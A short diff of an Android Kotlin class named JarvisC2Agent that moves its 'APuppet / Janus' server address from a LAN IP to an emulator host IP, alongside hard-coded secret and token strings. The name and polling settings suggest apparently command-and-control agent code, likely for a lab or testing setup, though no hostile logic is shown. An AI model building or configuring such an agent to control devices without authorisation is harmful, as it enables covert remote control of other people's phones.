@@ -35,7 +35,8 @@ class JarvisC2Agent(private val context: Context) {
             "KUn9Nf1WGiBb31mEHrU5-NDo_K-BEUA0laGL6yFdnT0"
 
         // ── APuppet / Janus server ──────────────────────────────────────────
-        private const val APUPPET_SERVER   = "192.168.10.52"
+        // Genymotion: host = 10.0.3.2  |  Physical LAN: 192.168.10.52
+        private const val APUPPET_SERVER   = "10.0.3.2"
         private const val APUPPET_SECRET   = "9qm7DfBd"
 
         // ── Polling ─────────────────────────────────────────────────────────
